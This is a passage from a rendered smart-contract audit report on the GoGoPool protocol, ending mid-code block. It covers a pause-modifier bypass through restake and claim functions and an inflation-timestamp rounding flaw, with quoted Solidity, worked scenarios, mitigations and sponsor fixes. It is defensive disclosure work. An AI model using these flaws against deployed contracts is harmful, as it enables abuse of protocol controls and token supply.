Severity.</p>\n<p>I will be consulting with an additional Judge to ensure that the logic above is acceptable given the custom scope for this contest.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/702#issuecomment-1421415846\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged. </p>\n<p>We’re not going to fix this in the first iteration of our protocol, we’re expecting to only have one active multisig. We will definitely implement some system to distribute minipools between multisigs when we have more.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-bypass-whennotpaused-modifier\" style=\"position:relative;\"><a href=\"#m-05-bypass-whennotpaused-modifier\" aria-label=\"m 05 bypass whennotpaused modifier permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/673\">[M-05] Bypass <code>whenNotPaused</code> modifier</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/673\">__141345__</a>, also found by <a href=\"undefined\">HollaDieWaldfee</a>, <a href=\"undefined\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/858\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/788\">ak1</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/711\">cryptostellar5</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/441\">Nyx</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/415\">ck</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/351\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/350\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/334\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/304\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/236\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/79\">RaymondFam</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328-L332\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328-L332</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89-L114\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89-L114</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimProtocolDAO.sol#L20-L35\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimProtocolDAO.sol#L20-L35</a></p>\n<p>The <code>whenNotPaused</code> modifier is used to pause minipool creation and staking/withdrawing GGP. However, there are several cases this modifier could be bypassed, which breaks the intended admin control function and special mode.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong><code>stake()</code></strong></p>\n<p>In paused mode, no more <code>stakeGGP()</code> is allowed,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">319</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">whenNotPaused</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">320</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk3\">// Transfer GGP tokens from staker to this contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">321</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">322</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk11\">_stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">323</span><span class=\"mtk1\">: \t}</span></span></span></code></pre>\n<p>However, <code>restakeGGP()</code> is still available, which potentially violate the purpose of pause mode.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">328</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">restakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlySpecificRegisteredContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">, msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk3\">// Transfer GGP tokens from the ClaimNodeOp contract to this contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">330</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">331</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk11\">_stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">332</span><span class=\"mtk1\">: \t}</span></span></span></code></pre>\n<p><strong><code>withdraw()</code></strong></p>\n<p>In paused mode, no more <code>withdrawGGP()</code> is allowed,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">358</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">whenNotPaused</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">373</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, <code>claimAndRestake()</code> is still available, which can withdraw from the vault.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ClaimNodeOp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">089</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAndRestake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimAmt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">restakeAmt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawToken</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">restakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">restakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">restakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">restakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">: \t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">claimAmt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">claimAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">: \t\t}</span></span></span></code></pre>\n<p>The function <code>spend()</code> can also ignore the pause mode to withdraw from the vault. But this is a guardian function. It could be intended behavior.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ClaimProtocolDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">spend</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">21: \t\t</span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">invoiceID</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">22: \t\t</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">recipientAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">23: \t\t</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">: \t) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipientAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggpToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>add the <code>whenNotPaused</code> modifier to <code>restakeGGP()</code> and <code>claimAndRestake()</code></li>\n<li>maybe also for guardian function <code>spend()</code>.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/673\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/673#issuecomment-1407733362\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown an inconsistency within similar functions regarding how they behave during a pause.<br>\nBecause the finding pertains to an inconsistent functionality, without a loss of principal, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Pause claimAndRestake as well: <a href=\"https://github.com/multisig-labs/gogopool/pull/22\">multisig-labs/gogopool#22</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/14\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/30\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-06-inflation-rate-can-be-reduced-by-half-at-most-if-it-gets-called-every-199-interval\" style=\"position:relative;\"><a href=\"#m-06-inflation-rate-can-be-reduced-by-half-at-most-if-it-gets-called-every-199-interval\" aria-label=\"m 06 inflation rate can be reduced by half at most if it gets called every 199 interval permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/648\">[M-06] Inflation rate can be reduced by half at most if it gets called every 1.99 interval</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/648\">wagmi</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/811\">peritoflores</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/674\">sces60107</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/646\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/575\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/464\">slowmoses</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/374\">supernova</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/239\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/157\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/92\">chaduke</a></em></p>\n<p>When doing inflation, function <code>getInflationAmt()</code> calculated number of intervals elapsed by dividing the duration with interval length.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getInflationIntervalsElapsed</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ProtocolDAO</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getInflationIntervalStartTime</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ContractHasNotBeenInitialized</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getInflationIntervalSeconds</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>As we can noticed that, this calculation is rounding down, it means if <code>block.timestamp - startTime = 1.99 intervals</code>, it only account for <code>1 interval</code>.</p>\n<p>However, when updating start time after inflating, it still update to current timestamp while it should only increased by <code>intervalLength * intervalsElapsed</code> instead.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">addUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;RewardsPool.InflationIntervalStartTime&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">inflationIntervalElapsedSeconds</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// @audit should only update to oldStartTime + inverval * numInterval</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;RewardsPool.RewardsCycleTotalAmt&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">newTokens</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Since default value of inflation interval = 1 days and reward cycle length = 14 days, so the impact is reduced. However, these configs can be changed in the future.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the scenario:</p>\n<ol>\n<li>Assume last inflation time is <code>InflationIntervalStartTime = 100</code>. <code>InflationIntervalSeconds = 50</code>.</li>\n<li>At <code>timestamp = 199</code>, function <code>getInflationAmt()</code> will calculate</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">inflationIntervalsElapsed</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">199</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">100</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Compute inflation for total inflation intervals elapsed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">inflationIntervalsElapsed</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">newTotalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newTotalSupply</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">inflationRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk3\">// @audit only loop once.</span></span></span></code></pre>\n<ol start=\"3\">\n<li>And then in <code>inflate()</code> function, <code>InflationIntervalStartTime</code> is still updated to current timestamp, so <code>InflationIntervalStartTime = 199</code>.</li>\n<li>If this sequence of actions are repeatedly used, we can easily see</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">InflationIntervalStartTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">199</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inflated</span><span class=\"mtk1\"> </span><span 